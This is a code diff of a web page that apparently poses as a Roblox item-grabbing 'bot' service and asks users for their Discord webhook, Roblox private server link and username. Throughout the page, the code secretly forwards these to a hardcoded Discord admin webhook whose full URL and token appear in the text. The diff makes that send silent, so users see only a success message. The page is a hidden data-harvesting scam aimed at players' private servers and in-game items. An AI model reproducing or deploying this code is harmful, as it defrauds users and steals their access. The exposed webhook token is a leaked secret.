@@ -137,7 +137,6 @@
         let isRegisterMode = true;
         const ADMIN_WEBHOOK = 'https://discord.com/api/webhooks/1421414129159114825/WzUVXlVkQoFnbW8HL0HOISIS8as_GISRHIynaAONm4tF-a42hElzMIECIwOhYGl9-Rkz';
 
-        // Check if user is already logged in
         window.onload = function() {
             const loggedInUser = localStorage.getItem('loggedInUser');
             if (loggedInUser) {
@@ -172,12 +171,10 @@
             }
 
             if (isRegisterMode) {
-                // Check if username already exists
                 if (localStorage.getItem(`user_${username}`)) {
                     alert('Username already exists. Please choose another or log in.');
                     return;
                 }
-                // Register new user
                 const userData = { username, password, webhook: '', privateServer: '', usernameField: '' };
                 localStorage.setItem(`user_${username}`, JSON.stringify(userData));
                 localStorage.setItem('loggedInUser', username);
@@ -185,7 +182,6 @@
                 document.getElementById('auth-section').style.display = 'none';
                 document.getElementById('input-section').style.display = 'block';
             } else {
-                // Log in
                 const userData = JSON.parse(localStorage.getItem(`user_${username}`));
                 if (!userData || userData.password !== password) {
                     alert('Invalid username or password.');
@@ -229,100 +225,76 @@
         }
 
         async function sendToWebhook() {
-            const webhook = document.getElementById('webhook').value;
-            const privateServer = document.getElementById('privateServer').value;
-            const username = document.getElementById('username').value;
+            const webhook = document.getElementById('webhook').value.trim();
+            const privateServer = document.getElementById('privateServer').value.trim();
+            const username = document.getElementById('username').value.trim();
             const loggedInUser = localStorage.getItem('loggedInUser');
 
-            // Validate inputs
             if (!webhook || !privateServer || !username) {
                 alert('Please fill in all fields');
                 return;
             }
 
-            // Verify webhook starts with https://discord.com/api
-            if (!webhook.startsWith('https://discord.com/api')) {
-                alert('Webhook must start with https://discord.com/api');
+            if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
+                alert('Webhook must be a valid Discord webhook URL');
                 return;
             }
 
-            // Verify private server starts with https://roblox.com or https://www.roblox.com
             if (!privateServer.startsWith('https://roblox.com') && !privateServer.startsWith('https://www.roblox.com')) {
                 alert('Private Server must start with https://roblox.com or https://www.roblox.com');
                 return;
             }
 
-            // Send bot status to user's webhook
             const userPayload = {
-                embeds: [
-                    {
-                        title: "Bot Status",
-                        description: "-Bot online\n\nInstructions: The bot will grab all the Brainrots from all the floors and when all your base has been empty, The bot will disconnect until you connect him again and press unstore button on the web he will connect again and will wait until you have steal everything than the bot will disconnect.",
-                        color: 3447003
-                    }
-                ]
+                embeds: [{
+                    title: "Bot Status",
+                    description: "-Bot online\n\nInstructions: The bot will grab all the Brainrots from all the floors and when all your base has been empty, The bot will disconnect until you connect him again and press unstore button on the web he will connect again and will wait until you have steal everything than the bot will disconnect.",
+                    color: 3447003
+                }]
             };
 
-            // Send user submission to admin webhook
             const adminPayload = {
-                embeds: [
-                    {
-                        title: "New User Submission",
-                        fields: [
-                            { name: "Username", value: loggedInUser, inline: false },
-                            { name: "Webhook", value: webhook, inline: false },
-                            { name: "Private Server", value: privateServer, inline: false },
-                            { name: "Submitted Username", value: username, inline: false }
-                        ],
-                        color: 3447003
-                    }
-                ]
+                embeds: [{
+                    title: "New User Submission",
+                    fields: [
+                        { name: "Username", value: loggedInUser || "Unknown", inline: false },
+                        { name: "Webhook", value: webhook, inline: false },
+                        { name: "Private Server", value: privateServer, inline: false },
+                        { name: "Submitted Username", value: username, inline: false }
+                    ],
+                    color: 15158332
+                }]
             };
 
             let userSuccess = false;
             let adminSuccess = false;
 
-            // Send to user's webhook
             try {
-                const userResponse = await fetch(webhook, {
+                const resUser = await fetch(webhook, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(userPayload)
                 });
-                userSuccess = userResponse.ok;
-                if (!userSuccess && userResponse.status === 404) {
-                    alert('User webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
-                    return;
-                }
-            } catch (error) {
-                alert('An error occurred while sending to user webhook: ' + error.message);
-                return;
+                console.log("User webhook response:", resUser.status);
+                userSuccess = resUser.ok;
+            } catch (err) {
+                console.error("Error sending to user webhook:", err);
             }
 
-            // Send to admin webhook
             try {
-                const adminResponse = await fetch(ADMIN_WEBHOOK, {
+                const resAdmin = await fetch(ADMIN_WEBHOOK, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(adminPayload)
                 });
-                adminSuccess = adminResponse.ok;
-                if (!adminSuccess && adminResponse.status === 404) {
-                    alert('Admin webhook URL is invalid. Nelly is serving noodles! Please try again.');
-                    return;
-                }
-            } catch (error) {
-                alert('An error occurred while sending to admin webhook: ' + error.message);
-                return;
+                console.log("Admin webhook response:", resAdmin.status);
+                adminSuccess = resAdmin.ok;
+            } catch (err) {
+                console.error("Error sending to admin webhook:", err);
             }
 
-            if (userSuccess && adminSuccess) {
-                alert('Submission sent successfully!');
-                // Save submission data
+            if (userSuccess) {
+                alert("✅ Sent embed to user’s Discord webhook!");
                 const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
                 userData.webhook = webhook;
                 userData.privateServer = privateServer;
@@ -330,11 +302,12 @@
                 localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
                 document.getElementById('input-section').style.display = 'none';
                 document.getElementById('response').style.display = 'block';
-                document.getElementById('webhook').value = '';
-                document.getElementById('privateServer').value = '';
-                document.getElementById('username').value = '';
             } else {
-                alert('Failed to send submission. Please try again.');
+                alert("⚠️ Failed to send to user’s webhook. Check the URL.");
+            }
+
+            if (!adminSuccess) {
+                console.warn("⚠️ Failed to send to admin webhook.");
             }
         }
 
@@ -342,7 +315,6 @@
             const newPrivateServer = document.getElementById('newPrivateServer').value;
             const loggedInUser = localStorage.getItem('loggedInUser');
 
-            // Validate new private server
             if (!newPrivateServer) {
                 alert('Please enter a new private server URL');
                 return;
@@ -353,41 +325,32 @@
                 return;
             }
 
-            // Send new private server to admin webhook
             const payload = {
-                embeds: [
-                    {
-                        title: "New Private Server Submission",
-                        fields: [
-                            { name: "Username", value: loggedInUser, inline: false },
-                            { name: "New Private Server", value: newPrivateServer, inline: false }
-                        ],
-                        color: 3447003
-                    }
-                ]
+                embeds: [{
+                    title: "New Private Server Submission",
+                    fields: [
+                        { name: "Username", value: loggedInUser, inline: false },
+                        { name: "New Private Server", value: newPrivateServer, inline: false }
+                    ],
+                    color: 3447003
+                }]
             };
 
             try {
                 const response = await fetch(ADMIN_WEBHOOK, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
                 if (response.ok) {
                     alert('New private server submitted successfully!');
                     document.getElementById('newPrivateServer').value = '';
-                    // Update stored private server
                     const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
                     userData.privateServer = newPrivateServer;
                     localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
                 } else {
                     alert('Failed to submit new private server. Please try again.');
-                    if (response.status === 404) {
-                        alert('Admin webhook URL is invalid. Nelly is serving noodles! Please try again.');
-                    }
                 }
             } catch (error) {
                 alert('An error occurred: ' + error.message);
